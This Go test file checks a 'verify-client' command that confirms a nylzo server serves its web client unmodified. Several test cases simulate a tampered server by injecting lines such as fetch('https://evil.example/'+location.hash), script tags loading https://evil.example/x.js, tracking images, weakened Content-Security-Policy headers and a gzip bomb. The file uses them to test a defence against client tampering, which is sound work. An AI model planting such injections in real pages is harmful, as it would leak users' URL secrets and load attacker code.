package cli

import (
	"bytes"
	"compress/gzip"
	"io"
	"io/fs"
	"log/slog"
	"maps"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/misaon/nylzo/internal/server/config"

	"github.com/misaon/nylzo/internal/client"
	"github.com/misaon/nylzo/internal/server"
	"github.com/misaon/nylzo/internal/server/webclient"
	"github.com/misaon/nylzo/internal/store/disk"
	"github.com/misaon/nylzo/internal/store/sqlite"
)

const (
	webIndex = `<!doctype html><html><head><script type="module" src="/assets/index-a1.js" nonce="__NYLZO_CSP_NONCE__"></script><link rel="stylesheet" href="/assets/style-b2.css" nonce="__NYLZO_CSP_NONCE__"></head><body></body></html>`
	webHome  = `<!doctype html><html><head><!--nylzo:public--><link rel="canonical" href="__NYLZO_PUBLIC_URL__/"><script type="application/ld+json" nonce="__NYLZO_CSP_NONCE__">{"url":"__NYLZO_PUBLIC_URL__/"}</script><!--/nylzo:public--><script type="module" src="/assets/index-a1.js" nonce="__NYLZO_CSP_NONCE__"></script></head><body><h1>Nylzo</h1></body></html>`
	webJS    = "console.log('nylzo')"
	webIcon  = `<svg xmlns="http://www.w3.org/2000/svg"/>`
)

func gunzipBytes(t *testing.T, data []byte) []byte {
	t.Helper()
	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	plain, err := io.ReadAll(reader)
	if err != nil {
		t.Fatal(err)
	}
	return plain
}

func gzipBytes(t *testing.T, data []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	compressor := gzip.NewWriter(&out)
	if _, err := compressor.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := compressor.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func webFiles(t *testing.T) fstest.MapFS {
	t.Helper()
	return fstest.MapFS{
		"placeholder.html":             {Data: []byte("placeholder")},
		"dist/index.html":              {Data: []byte(webIndex)},
		"dist/home.en.html":            {Data: []byte(webHome)},
		"dist/home.cs.html":            {Data: []byte(strings.Replace(webHome, "<html>", `<html lang="cs">`, 1))},
		"dist/assets/index-a1.js":      {Data: []byte(webJS)},
		"dist/assets/index-a1.js.gz":   {Data: gzipBytes(t, []byte(webJS))},
		"dist/assets/style-b2.css":     {Data: []byte("body{}")},
		"dist/assets/kdf-worker-c3.js": {Data: []byte("self.onmessage=null")},
		"dist/assets/favicon-d4.svg":   {Data: []byte(webIcon)},
		"dist/assets/favicon-e5.png":   {Data: []byte("\x89PNG\r\n\x1a\n")},
	}
}

func newWebTestServer(t *testing.T, files fs.FS, version string, wrap func(http.Handler) http.Handler) string {
	t.Helper()
	return newPublicWebTestServer(t, files, version, "", wrap)
}

func newPublicWebTestServer(
	t *testing.T,
	files fs.FS,
	version, publicURL string,
	wrap func(http.Handler) http.Handler,
) string {
	t.Helper()
	directory := t.TempDir()
	settings := config.Defaults()
	settings.DataDir = directory
	settings.Pepper = bytes.Repeat([]byte{7}, 32)
	settings.Version = version
	settings.PublicURL = publicURL
	storage, err := sqlite.Open(t.Context(), filepath.Join(directory, "nylzo.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { storage.Close() })
	blobs, err := disk.New(directory)
	if err != nil {
		t.Fatal(err)
	}
	apiServer, err := server.New(
		&settings,
		storage,
		blobs,
		server.WithWebFiles(files),
		server.WithLogger(slog.New(slog.DiscardHandler)),
	)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(apiServer.Close)
	handler := apiServer.Handler()
	if wrap != nil {
		handler = wrap(handler)
	}
	httpServer := httptest.NewServer(handler)
	t.Cleanup(httpServer.Close)
	return httpServer.URL
}

type served struct {
	header http.Header
	body   []byte
}

func rewrite(match func(*http.Request) bool, change func(*served)) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if !match(r) {
				next.ServeHTTP(w, r)
				return
			}
			recorder := httptest.NewRecorder()
			next.ServeHTTP(recorder, r)
			response := &served{header: recorder.Header().Clone(), body: recorder.Body.Bytes()}
			change(response)
			maps.Copy(w.Header(), response.header)
			w.Header().Del("Content-Length")
			w.WriteHeader(recorder.Code)
			w.Write(response.body)
		})
	}
}

func pathIs(path string) func(*http.Request) bool {
	return func(r *http.Request) bool { return r.URL.Path == path }
}

func browserAsks(path string) func(*http.Request) bool {
	return func(r *http.Request) bool {
		return r.URL.Path == path && strings.Contains(r.Header.Get("Accept-Encoding"), "br")
	}
}

func runVerify(t *testing.T, url string, local fs.FS, flags ...string) commandResult {
	t.Helper()
	var stdout, stderr bytes.Buffer
	environment := &Environment{
		Stdout:    &stdout,
		Stderr:    &stderr,
		Getenv:    getenvFrom(nil),
		Terminal:  noTerminal{},
		Version:   "test",
		TempDir:   t.TempDir(),
		WebClient: func() (webclient.Build, error) { return webclient.Load(local) },
	}
	code := Run(append([]string{"verify-client", "--server", url}, flags...), environment)
	return commandResult{code: code, stdout: stdout.String(), stderr: stderr.String()}
}

func TestVerifyClientAcceptsTheSameClient(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	result := runVerify(t, newWebTestServer(t, files, "test", nil), files)
	if result.code != exitOK ||
		result.stdout != "the server sends the web client of nylzo test unchanged: 6 pages and 5 files checked\n" {
		t.Fatalf("%+v", result)
	}
	public := runVerify(t, newPublicWebTestServer(t, files, "test", "https://nylzo.example:8443", nil), files)
	if public.code != exitOK {
		t.Fatalf("a server with a public URL: %+v", public)
	}
	if !strings.Contains(result.stderr, "a server can recognise it") {
		t.Fatalf("the result must say what it cannot see: %q", result.stderr)
	}
}

func TestVerifyClientRefusesAChangedClient(t *testing.T) {
	t.Parallel()
	for _, testCase := range []struct {
		name string
		wrap func(http.Handler) http.Handler
		want string
	}{
		{"asset", rewrite(pathIs("/assets/index-a1.js"), func(response *served) {
			response.body = []byte("fetch('https://evil.example/'+location.hash)")
			response.header.Del("Content-Encoding")
		}), "/assets/index-a1.js: the file differs"},
		{"gzip variant for browsers only", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
			response.body = gzipBytes(t, []byte("fetch('https://evil.example/'+location.hash)"))
			response.header.Set("Content-Encoding", "gzip")
		}), "/assets/index-a1.js (as a browser asks for it): the file differs"},
		{"uncompressed asset that a browser gets compressed", rewrite(browserAsks("/assets/style-b2.css"), func(response *served) {
			response.body = gzipBytes(t, []byte("body{background:url(https://evil.example/)}"))
			response.header.Set("Content-Encoding", "gzip")
		}), "/assets/style-b2.css (as a browser asks for it): the file differs"},
		{"brotli answer", rewrite(browserAsks("/assets/style-b2.css"), func(response *served) {
			response.header.Set("Content-Encoding", "br")
		}), "an encoding that this nylzo never sends"},
		{"gzip to a request without compression", rewrite(func(r *http.Request) bool {
			return r.URL.Path == "/assets/style-b2.css" && r.Header.Get("Accept-Encoding") == "identity"
		}, func(response *served) {
			response.body = gzipBytes(t, response.body)
			response.header.Set("Content-Encoding", "gzip")
		}), "compressed a response that was asked for without compression"},
		{"page for browsers only", rewrite(browserAsks("/"), func(response *served) {
			response.body = gzipBytes(t, bytes.Replace(gunzipBytes(t, response.body), []byte("</head>"), []byte(`<script src="https://evil.example/x.js"></script></head>`), 1))
		}), "/ (as a browser asks for it): the page differs"},
		{"Czech home page", rewrite(pathIs("/cs/"), func(response *served) {
			response.body = bytes.Replace(response.body, []byte("<h1>"), []byte(`<h1><img src="https://evil.example/t.gif">`), 1)
		}), "/cs/: the page differs"},
		{"page without Vary", rewrite(pathIs("/sent"), func(response *served) {
			response.header.Del("Vary")
		}), "/sent: the Vary header differs"},
		{"public URL in the manifest that the server would refuse", rewrite(pathIs(webclient.ManifestPath), func(response *served) {
			response.body = bytes.Replace(response.body, []byte(`"public_url":""`), []byte(`"public_url":"http://evil.example"`), 1)
		}), "names a public URL that this nylzo would refuse"},
		{"public URL in the manifest that the pages do not use", rewrite(pathIs(webclient.ManifestPath), func(response *served) {
			response.body = bytes.Replace(response.body, []byte(`"public_url":""`), []byte(`"public_url":"https://evil.example"`), 1)
		}), "/: the page "},
		{"weaker referrer policy", rewrite(pathIs("/assets/style-b2.css"), func(response *served) {
			response.header.Set("Referrer-Policy", "unsafe-url")
		}), "the Referrer-Policy header differs"},
		{"reading page", rewrite(func(r *http.Request) bool { return strings.HasPrefix(r.URL.Path, "/m/") }, func(response *served) {
			response.body = bytes.Replace(response.body, []byte("</head>"), []byte(`<script src="https://evil.example/x.js"></script></head>`), 1)
		}), "the page differs"},
		{"weaker page CSP", rewrite(pathIs("/"), func(response *served) {
			response.header.Set("Content-Security-Policy", strings.Replace(response.header.Get("Content-Security-Policy"), "default-src 'none'", "default-src *", 1))
		}), "/: the Content-Security-Policy differs"},
		{"second CSP header", rewrite(pathIs("/sent"), func(response *served) {
			response.header.Add("Content-Security-Policy", "script-src *")
		}), "/sent: the Content-Security-Policy header differs"},
		{"short nonce", rewrite(pathIs("/report"), func(response *served) {
			old := pageNonce.FindStringSubmatch(response.header.Get("Content-Security-Policy"))[1]
			response.header.Set("Content-Security-Policy", webclient.PageCSP("abc"))
			response.body = bytes.ReplaceAll(response.body, []byte(old), []byte("abc"))
		}), "/report: the Content-Security-Policy differs"},
		{"nonce that the page does not use", rewrite(pathIs("/transparency"), func(response *served) {
			response.header.Set("Content-Security-Policy", webclient.PageCSP("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
		}), "/transparency: the page does not use the nonce"},
		{"missing nosniff", rewrite(pathIs("/assets/kdf-worker-c3.js"), func(response *served) {
			response.header.Del("X-Content-Type-Options")
		}), "the X-Content-Type-Options header differs"},
		{"worker CSP", rewrite(pathIs("/assets/kdf-worker-c3.js"), func(response *served) {
			response.header.Set("Content-Security-Policy", "default-src *")
		}), "/assets/kdf-worker-c3.js: the headers differ"},
		{"content type", rewrite(pathIs("/assets/style-b2.css"), func(response *served) {
			response.header.Set("Content-Type", "text/html; charset=utf-8")
		}), "/assets/style-b2.css: the Content-Type header differs"},
		{"icon served as a page", rewrite(pathIs("/assets/favicon-d4.svg"), func(response *served) {
			response.header.Set("Content-Type", "text/html; charset=utf-8")
		}), "/assets/favicon-d4.svg: the Content-Type header differs"},
		{"two content encodings", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
			response.header.Add("Content-Encoding", "gzip")
		}), "/assets/index-a1.js (as a browser asks for it): the server sent the Content-Encoding header"},
		{"refresh to another page", rewrite(pathIs("/"), func(response *served) {
			response.header.Set("Refresh", "0; url=/elsewhere")
		}), "/: the server sent the Refresh header"},
		{"cookie on a file", rewrite(pathIs("/assets/style-b2.css"), func(response *served) {
			response.header.Set("Set-Cookie", "tracked=1")
		}), "/assets/style-b2.css: the server sent the Set-Cookie header"},
		{"second content type", rewrite(pathIs("/report"), func(response *served) {
			response.header.Add("Content-Type", "text/plain")
		}), "/report: the Content-Type header differs"},
		{"compressed page to a request without compression", rewrite(func(r *http.Request) bool {
			return r.URL.Path == "/sent" && r.Header.Get("Accept-Encoding") == "identity"
		}, func(response *served) {
			response.body = gzipBytes(t, response.body)
			response.header.Set("Content-Encoding", "gzip")
		}), "/sent: the server compressed a response that was asked for without compression"},
		{"fixed nonce", rewrite(func(r *http.Request) bool { return r.URL.Path == "/" || r.URL.Path == "/sent" }, func(response *served) {
			old := pageNonce.FindStringSubmatch(response.header.Get("Content-Security-Policy"))[1]
			fixed := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			response.header.Set("Content-Security-Policy", webclient.PageCSP(fixed))
			response.body = bytes.ReplaceAll(response.body, []byte(old), []byte(fixed))
		}), "the server sent the same nonce twice"},
		{"style without nonce", rewrite(pathIs("/report"), func(response *served) {
			old := pageNonce.FindStringSubmatch(response.header.Get("Content-Security-Policy"))[1]
			response.body = bytes.Replace(response.body, []byte(`nonce="`+old+`"></head>`), []byte(`nonce="__NYLZO_CSP_NONCE__"></head>`), 1)
		}), "/report: the page does not use the nonce of its Content-Security-Policy everywhere"},
		{"manifest", rewrite(pathIs(webclient.ManifestPath), func(response *served) {
			response.body = bytes.Replace(response.body, []byte(`"sha256":"`), []byte(`"sha256":"0`), 1)
		}), "the server's client manifest differs"},
		{"gzip bomb", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
			response.body = gzipBytes(t, bytes.Repeat([]byte{'a'}, 16<<20))
			response.header.Set("Content-Encoding", "gzip")
		}), "/assets/index-a1.js (as a browser asks for it): the file differs"},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			files := webFiles(t)
			result := runVerify(t, newWebTestServer(t, files, "test", testCase.wrap), files)
			if result.code != exitError || result.stdout != "" || !strings.Contains(result.stderr, testCase.want) {
				t.Fatalf("want exit 1 with %q, got %+v", testCase.want, result)
			}
		})
	}
}

func TestVerifyClientNeedsTheSameRelease(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	result := runVerify(t, newWebTestServer(t, files, "v9.9.9\x1b[31m", nil), files)
	if result.code != exitError ||
		!strings.Contains(result.stderr, `the server runs nylzo v9.9.9\u001b[31m and this binary is test`) {
		t.Fatalf("%+v", result)
	}
}

func TestVerifyClientNeedsALocalClient(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	placeholder := fstest.MapFS{"placeholder.html": {Data: []byte("placeholder")}}
	result := runVerify(t, newWebTestServer(t, files, "test", nil), placeholder)
	if result.code != exitError || !strings.Contains(result.stderr, "carries no web client") {
		t.Fatalf("%+v", result)
	}
}

func TestVerifyClientNeedsAServer(t *testing.T) {
	t.Parallel()
	result := runWith(t, "", nil, nil, "verify-client")
	if result.code != exitUsage || !strings.Contains(result.stderr, "needs --server or NYLZO_SERVER") {
		t.Fatalf("%+v", result)
	}
	result = runWith(t, "", nil, nil, "verify-client", "--server", "http://example.org")
	if result.code != exitError || !strings.Contains(result.stderr, "https") {
		t.Fatalf("plain http to a remote server must be refused: %+v", result)
	}
}

func TestDecodedStopsAtTheLimit(t *testing.T) {
	t.Parallel()
	bomb := client.Fetched{
		Header: http.Header{"Content-Encoding": {"gzip"}},
		Body:   gzipBytes(t, bytes.Repeat([]byte{'a'}, 64<<20)),
	}
	body, err := decoded(&bomb, browserEncodings, 10, "/x")
	if err != nil || len(body) != 11 {
		t.Fatalf("decoded %d bytes, %v", len(body), err)
	}
}

func TestVerifyClientAcceptsAllowedProxyHeaders(t *testing.T) {
	t.Parallel()
	files := webFiles(t)
	proxy := rewrite(func(*http.Request) bool { return true }, func(response *served) {
		response.header.Set("Cf-Ray", "8f0e")
		response.header.Set("Server", "proxy")
	})
	url := newWebTestServer(t, files, "test", proxy)
	if result := runVerify(
		t,
		url,
		files,
	); result.code != exitError ||
		!strings.Contains(result.stderr, "the server sent the Cf-Ray header") {
		t.Fatalf("an unknown proxy header must fail until allowed: %+v", result)
	}
	if result := runVerify(t, url, files, "--allow-header", "cf-ray"); result.code != exitOK {
		t.Fatalf("an allowed proxy header must pass: %+v", result)
	}
	for _, name := range []string{"Refresh", "set-cookie", "NEL", "Link", "Speculation-Rules"} {
		if result := runVerify(t, url, files, "--allow-header", name); result.code != exitUsage {
			t.Fatalf("--allow-header %s must be refused: %+v", name, result)
		}
	}
}
